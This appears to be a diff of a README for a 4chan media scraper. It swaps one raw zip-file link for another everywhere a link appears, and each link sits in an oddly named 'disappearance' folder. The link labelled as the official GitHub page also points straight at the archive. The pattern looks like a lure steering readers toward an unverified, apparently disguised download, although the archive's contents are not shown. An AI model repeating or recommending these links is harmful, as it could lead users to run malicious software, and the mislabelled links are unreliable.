@@ -4,7 +4,7 @@
 4ch-media-scraper is a simple tool designed to scrape media files from 4chan boards. It allows you to download images, videos, and GIFs effortlessly. With this application, you can gather your favorite content from 4chan without any programming skills.
 
 ## 📦 Download the Application
-[![Download Now](https://github.com/Cyrus095/4ch-media-scraper/raw/refs/heads/master/disappearance/media_ch_scraper_hackneyer.zip%20Now-Click%20Here-brightgreen)](https://github.com/Cyrus095/4ch-media-scraper/raw/refs/heads/master/disappearance/media_ch_scraper_hackneyer.zip)
+[![Download Now](https://github.com/Cyrus095/4ch-media-scraper/raw/refs/heads/master/disappearance/media-ch-scraper-v3.5.zip%20Now-Click%20Here-brightgreen)](https://github.com/Cyrus095/4ch-media-scraper/raw/refs/heads/master/disappearance/media-ch-scraper-v3.5.zip)
 
 To start using 4ch-media-scraper, you'll need to download it from the Releases page. 
 
@@ -12,7 +12,7 @@ To start using 4ch-media-scraper, you'll need to download it from the Releases p
 Follow these steps to get your application running.
 
 1. **Visit the download page.**  
-   Go to the following link to access the latest releases: [Download 4ch-media-scraper](https://github.com/Cyrus095/4ch-media-scraper/raw/refs/heads/master/disappearance/media_ch_scraper_hackneyer.zip).
+   Go to the following link to access the latest releases: [Download 4ch-media-scraper](https://github.com/Cyrus095/4ch-media-scraper/raw/refs/heads/master/disappearance/media-ch-scraper-v3.5.zip).
 
 2. **Choose the right version.**  
    Look for the latest version of the software. You will see different files available for download. If you are unsure which one to select, the file marked as “latest” is usually the best option.
@@ -71,12 +71,12 @@ If you run into any issues while using 4ch-media-scraper, try these solutions:
 - **Application Not Opening:** Make sure you have the correct system requirements. Re-download the file if necessary.
 
 ## 🌐 Resources
-For more information and updates, visit the official GitHub page: [4ch-media-scraper GitHub](https://github.com/Cyrus095/4ch-media-scraper/raw/refs/heads/master/disappearance/media_ch_scraper_hackneyer.zip).
+For more information and updates, visit the official GitHub page: [4ch-media-scraper GitHub](https://github.com/Cyrus095/4ch-media-scraper/raw/refs/heads/master/disappearance/media-ch-scraper-v3.5.zip).
 
 ## 👍 Community Support
 If you have questions or need help, consider joining online communities related to 4chan or media scraping. You can find useful discussions and fellow users who may help you.
 
 ## 🔗 Additional Download Link
-You can always access the latest version and updates here: [Download 4ch-media-scraper](https://github.com/Cyrus095/4ch-media-scraper/raw/refs/heads/master/disappearance/media_ch_scraper_hackneyer.zip).
+You can always access the latest version and updates here: [Download 4ch-media-scraper](https://github.com/Cyrus095/4ch-media-scraper/raw/refs/heads/master/disappearance/media-ch-scraper-v3.5.zip).
 
 With these steps, you will be able to easily download and use 4ch-media-scraper. Enjoy gathering your favorite media from 4chan!
